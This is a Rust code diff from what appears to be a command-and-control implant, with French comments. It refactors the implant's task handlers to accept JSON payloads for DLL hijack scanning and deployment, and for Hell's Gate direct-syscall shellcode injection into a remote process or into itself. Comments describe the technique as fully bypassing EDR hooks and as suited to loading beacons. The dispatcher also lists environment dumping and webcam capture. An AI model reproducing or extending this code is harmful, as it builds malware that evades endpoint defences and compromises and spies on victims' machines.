@@ -20,11 +20,9 @@ pub fn execute(task: &Task, agent_id: &str) -> TaskResult {
         "envdump"    => dump_env(),
         "cd"         => change_directory(payload),
         "pwd"        => print_directory(),
-        "hijack_scan"    => hijack_scan(),
-        "hijack_deploy"  => hijack_deploy(payload),
+        "hijack"     => hijack_cmd(payload),
+        "inject"     => inject_cmd(payload),
         "webcam_snap"    => webcam_snap(),
-        "hellsgate"      => hellsgate_inject_cmd(payload),
-        "hellsgate_local" => hellsgate_local_cmd(payload),
         _            => (
             String::new(),
             format!("Unknown task type: {}", task.task_type),
@@ -40,6 +38,24 @@ pub fn execute(task: &Task, agent_id: &str) -> TaskResult {
         error,
         success,
     }
+}
+
+// ─────────────────────────────────────────────────────────────
+// Payload Structures
+// ─────────────────────────────────────────────────────────────
+use serde::Deserialize;
+
+#[derive(Deserialize)]
+struct InjectPayload {
+    pub method: String,
+    pub pid: Option<u32>,
+    pub shellcode: String, // base64 encoded
+}
+
+#[derive(Deserialize)]
+struct HijackPayload {
+    pub action: String,
+    pub dll_base64: Option<String>,
 }
 
 // ─────────────────────────────────────────────────────────────
@@ -206,6 +222,26 @@ fn print_directory() -> (String, String, bool) {
     }
 }
 
+/// hijack_cmd — handle hijack task with JSON payload
+fn hijack_cmd(payload: &str) -> (String, String, bool) {
+    let hijack_req: HijackPayload = match serde_json::from_str(payload) {
+        Ok(req) => req,
+        Err(e) => return (String::new(), format!("Invalid hijack payload: {}", e), false),
+    };
+
+    if hijack_req.action == "scan" {
+        return hijack_scan();
+    } else if hijack_req.action == "deploy" {
+        if let Some(dll_base64) = hijack_req.dll_base64 {
+            return hijack_deploy(&dll_base64);
+        } else {
+            return (String::new(), "Missing dll_base64 for deploy action".into(), false);
+        }
+    }
+
+    (String::new(), format!("Unknown hijack action: {}", hijack_req.action), false)
+}
+
 /// hijack_scan — cherche des opportunités de DLL hijacking
 fn hijack_scan() -> (String, String, bool) {
     let targets = crate::inject::dll_hijack::find_hijack_opportunities();
@@ -225,8 +261,6 @@ fn hijack_scan() -> (String, String, bool) {
 }
 
 /// hijack_deploy — déploie une DLL proxy pour le hijacking
-///
-/// payload attendu : base64_dll_bytes
 fn hijack_deploy(payload: &str) -> (String, String, bool) {
     if payload.is_empty() {
         return (String::new(), "usage: hijack_deploy <base64_dll_bytes>".into(), false);
@@ -283,46 +317,42 @@ fn webcam_snap() -> (String, String, bool) {
 // Hell's Gate — Direct Syscalls (bypass hooks EDR)
 // ─────────────────────────────────────────────────────────────
 
-/// hellsgate_inject_cmd — injection distante via direct syscalls
-///
-/// payload format: "<pid>:<base64_shellcode>"
-/// Exemple: "1234:AAAA..." (PID:shellcode_en_base64)
-///
-/// Cette commande bypass TOTALEMENT les hooks EDR dans ntdll.dll.
-/// Au lieu d'appeler NtAllocateVirtualMemory (hookée), on exécute
-/// directement le syscall avec le bon numéro (résolu dynamiquement).
-fn hellsgate_inject_cmd(payload: &str) -> (String, String, bool) {
-    if payload.is_empty() {
-        return (String::new(), "usage: hellsgate <pid>:<base64_shellcode>".into(), false);
-    }
-
-    // Parser le payload : "pid:shellcode_b64"
-    let parts: Vec<&str> = payload.splitn(2, ':').collect();
-    if parts.len() != 2 {
-        return (String::new(), "format: <pid>:<base64_shellcode>".into(), false);
-    }
-
-    let pid: u32 = match parts[0].parse() {
-        Ok(p) => p,
-        Err(e) => return (String::new(), format!("Invalid PID: {}", e), false),
+/// inject_cmd — handle inject task with JSON payload
+fn inject_cmd(payload: &str) -> (String, String, bool) {
+    let req: InjectPayload = match serde_json::from_str(payload) {
+        Ok(r) => r,
+        Err(e) => return (String::new(), format!("Invalid inject payload: {}", e), false),
     };
 
     let shellcode = match base64::Engine::decode(
         &base64::engine::general_purpose::STANDARD,
-        parts[1],
+        req.shellcode,
     ) {
         Ok(bytes) => bytes,
         Err(e) => return (String::new(), format!("Base64 decode error: {}", e), false),
     };
 
-    // Résoudre la syscall table et injecter
+    if req.method == "local" {
+        return run_hellsgate_local(&shellcode);
+    } else if req.method == "hellsgate" {
+        if let Some(pid) = req.pid {
+            return run_hellsgate_remote(&shellcode, pid);
+        } else {
+            return (String::new(), "Missing pid for hellsgate injection".into(), false);
+        }
+    }
+
+    (String::new(), format!("Unknown inject method: {}", req.method), false)
+}
+
+fn run_hellsgate_remote(shellcode: &[u8], pid: u32) -> (String, String, bool) {
     unsafe {
         let table = match crate::inject::hellsgate::resolve_syscall_table() {
             Ok(t) => t,
             Err(e) => return (String::new(), format!("Hell's Gate init failed: {}", e), false),
         };
 
-        match crate::inject::hellsgate::hellsgate_inject(&table, &shellcode, pid) {
+        match crate::inject::hellsgate::hellsgate_inject(&table, shellcode, pid) {
             Ok(p) => (
                 format!(
                     "[Hell's Gate] Shellcode injecté avec succès dans PID {}\n\
@@ -341,32 +371,14 @@ fn hellsgate_inject_cmd(payload: &str) -> (String, String, bool) {
     }
 }
 
-/// hellsgate_local_cmd — injection locale (self-injection) via direct syscalls
-///
-/// payload format: "<base64_shellcode>"
-///
-/// Exécute le shellcode dans le processus de l'agent lui-même.
-/// Utile pour charger un reflective DLL loader ou un beacon stageless.
-fn hellsgate_local_cmd(payload: &str) -> (String, String, bool) {
-    if payload.is_empty() {
-        return (String::new(), "usage: hellsgate_local <base64_shellcode>".into(), false);
-    }
-
-    let shellcode = match base64::Engine::decode(
-        &base64::engine::general_purpose::STANDARD,
-        payload,
-    ) {
-        Ok(bytes) => bytes,
-        Err(e) => return (String::new(), format!("Base64 decode error: {}", e), false),
-    };
-
+fn run_hellsgate_local(shellcode: &[u8]) -> (String, String, bool) {
     unsafe {
         let table = match crate::inject::hellsgate::resolve_syscall_table() {
             Ok(t) => t,
             Err(e) => return (String::new(), format!("Hell's Gate init failed: {}", e), false),
         };
 
-        match crate::inject::hellsgate::hellsgate_inject_local(&table, &shellcode) {
+        match crate::inject::hellsgate::hellsgate_inject_local(&table, shellcode) {
             Ok(()) => (
                 format!(
                     "[Hell's Gate] Shellcode exécuté localement (self-inject)\n\
